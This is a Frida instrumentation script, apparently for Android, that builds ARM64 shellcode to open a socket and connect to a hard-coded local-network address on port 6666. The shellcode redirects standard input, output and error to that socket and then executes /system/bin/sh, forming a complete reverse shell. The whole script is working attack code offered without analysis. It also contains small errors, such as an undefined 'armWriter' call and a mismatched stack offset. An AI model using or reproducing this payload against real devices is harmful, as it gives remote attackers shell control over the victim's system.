// Create sock_addr_in structure
console.log('[+] Building our sock_addr_in structure [!]');
var sock_addr_in = Memory.alloc(20);
Memory.writeU8(sock_addr_in, 0x2);
Memory.writeU8(sock_addr_in.add(1), 0x0);
// Change Me!
Memory.writeUShort(sock_addr_in.add(2), 0xA1A);
Memory.writeULong(sock_addr_in.add(4), 0x3601a8c0);

/*
    struct sockaddr_in {
	u_char	sin_len;            1 byte
	u_char	sin_family;         1 byte
	u_short	sin_port;           2 bytes
	struct	in_addr sin_addr;   4 bytes
	char	sin_zero[8];        8 bytes
};
 */

console.log('[+] Writing our Arm64 shellcode [!]');
var impl = Memory.alloc(Process.pageSize);
Memory.patchCode(impl, Process.pageSize, function (code) {
  var arm64Writer = new Arm64Writer(code, { pc: impl });
  // SUB             SP, SP, #0x50
  arm64Writer.putSubRegRegImm('sp', 'sp', 0x50);
  // STP             X29, X30, [SP, #0x40]
  arm64Writer.putStpRegRegRegOffset('x29', 'x30', 'sp', 0x40, 'pre-adjust');
  // ADD             X29, SP, #0x40
  arm64Writer.putAddRegRegImm('x29', 'sp', 0x40);
  // STR             X0, [SP, #0x18]
  arm64Writer.putStrRegRegOffset('x0', 'sp', 0x18); 
  // MOV             W0, #2
  arm64Writer.putInstruction(0x52800040);
  // MOV             W1, #1
  arm64Writer.putInstruction(0x52800021);
  // MOV             W2, WZR
  arm64Writer.putInstruction(0x2A1F03E2);
  arm64Writer.putCallAddressWithArguments(Module.findExportByName('libc.so', 'socket'), ['w0', 'w1', 'w2']);
  // STR             W0, [SP, #0x10]
  arm64Writer.putStrRegRegOffset('w0', 'sp', 0x10);
  // MOV             W2, #0x10
  arm64Writer.putInstruction(0x52800202);
  // LDR             X1, [SP, #0x18]
  arm64Writer.putLdrRegRegOffset('x1', 'sp', 0x18);
  arm64Writer.putCallAddressWithArguments(Module.findExportByName('libc.so', 'connect'), ['w0', 'x1', 'w2']);
  // LDR             W0, [SP, #0x10]
  arm64Writer.putLdrRegRegOffset('w0', 'sp', 0x10);
  // MOV             W1, WZR
  arm64Writer.putInstruction(0x2A1F03E1);
  arm64Writer.putCallAddressWithArguments(Module.findExportByName('libc.so', 'dup2'), ['w0', 'w1']);
  // LDR             W0, [SP, #0x10]
  arm64Writer.putLdrRegRegOffset('w0', 'sp', 0x10);
  // MOV             W1, #1
  arm64Writer.putInstruction(0x52800021);
  arm64Writer.putCallAddressWithArguments(Module.findExportByName('libc.so', 'dup2'), ['w0', 'w1']);
  // LDR             W0, [SP, #0x10]
  arm64Writer.putLdrRegRegOffset('w0', 'sp', 0x10);
  // MOV             W1, #2
  arm64Writer.putInstruction(0x52800041);
  arm64Writer.putCallAddressWithArguments(Module.findExportByName('libc.so', 'dup2'), ['w0', 'w1']);
  // LDP             X29, X30, [SP, #0x40]
  arm64Writer.putLdpRegRegRegOffset('x29', 'x30', 'sp', 0x20, 'pre-adjust');
  // ADD             SP, SP, #0x50
  arm64Writer.putAddRegRegImm('sp', 'sp', 0x50);
  // RET
  arm64Writer.putRet();
  armWriter.flush();
});
/** Dump the shellcode for debugging
var ins = Instruction.parse(impl);
for(var i = 0; i < 24 ; i++) {
    console.log(':= ' + ins.toString());
    ins = Instruction.parse(ins.next);
}
**/
// First argument will be to our sockaddr_in struct
var f = new NativeFunction(impl, 'int', ['pointer']);
// Call function ...
console.log('[+] Calling our Arm64 shellcode function [!]');
f(sock_addr_in);
console.log('[+] Calling execve [!]');
var execveFuncPtr = Module.findExportByName("libc.so", "execve");
var execve = new NativeFunction(execveFuncPtr, 'int', ['pointer', 'pointer', 'pointer']);
var sh = Memory.allocUtf8String('/system/bin/sh');
var ret = execve(sh, ptr(0), ptr(0));
console.log(ret);
